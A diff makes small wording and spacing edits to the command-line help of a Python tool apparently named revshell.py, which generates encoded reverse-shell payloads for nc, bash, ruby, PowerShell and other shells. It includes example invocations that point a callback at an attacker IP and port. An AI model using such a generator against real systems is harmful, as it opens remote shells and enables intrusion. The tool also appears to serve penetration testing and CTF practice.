@@ -43,21 +43,21 @@ parser = argparse.ArgumentParser(description=f'''{help_subtitle}\n{help_default_
         7. Powershell | ps
 \n{help_supported_encoding_types}\n
         1. base64 | b64   base64 encodes all characters.
-        2. url          url-encodes special characters.
-        3. url-all      url-encodes all characters.
+        2. url            url encodes special characters.
+        3. url-all        url encodes all characters.
 \nExamples:\n
 python3 revshell.py -i 10.13.3.7 -p 9001 -t nc -e url-all
 python3 revshell.py -p 1337 -o reverse_shell.txt
 python3 revshell.py -i tun0 -s /bin/bash -t ruby -e base64 -c''', formatter_class=RawTextHelpFormatter)
 
-parser.add_argument('-i', '--ip', type=str, metavar='', default="tun0", help='Specify the IP address you want to listen on.')
-parser.add_argument('-p', '--port', type=str, metavar = '', default="443", help='The port you want to listen on.')
+parser.add_argument('-i', '--ip', type=str, metavar='', default="tun0", help='The IP address you want to listen on')
+parser.add_argument('-p', '--port', type=str, metavar = '', default="443", help='The port you want to listen on')
 parser.add_argument('-s', '--shell', type=str, metavar = '', default = "/bin/sh", help='Which shell you want to use (e.g. /bin/bash, /bin/sh, etc.)')
 parser.add_argument('-t', '--type', type=str, metavar = '', default = "bash", help='The kind of reverse shell you would like (e.g. perl, python, nc, etc.)')
-parser.add_argument('-e', '--encode', type=str, metavar = '', help='Specify encoding for the shell.')
-parser.add_argument('-c', '--clipboard', action = 'store_true', help='Copies into clipboard.\n')
-parser.add_argument('-f', '--force', action = 'store_true', help='Forces tool to accept argument.\n')
-parser.add_argument('-o', '--outfile', type=str, metavar = '', help='File to output shell.')
+parser.add_argument('-e', '--encode', type=str, metavar = '', help='Specify encoding for the shell')
+parser.add_argument('-c', '--clipboard', action = 'store_true', help='Copies into clipboard\n')
+parser.add_argument('-f', '--force', action = 'store_true', help='Forces tool to accept argument\n')
+parser.add_argument('-o', '--outfile', type=str, metavar = '', help='File to output payload')
 
 args = parser.parse_args()
 
@@ -76,8 +76,8 @@ class shells():
         if encode not in encoding_types:
             sys.exit("""\nYou entered an unsupported encoding type. The available encoding types are:\n
             1. base64|b64   base64 encodes all characters.
-            2. url          url-encodes special characters.
-            3. url-all      url-encodes all characters.\n""")
+            2. url            url encodes special characters.
+            3. url-all        url encodes all characters.\n""")
         if encode == "url":
             return urllib.parse.quote_plus(reverse)
         # Encodes all characters
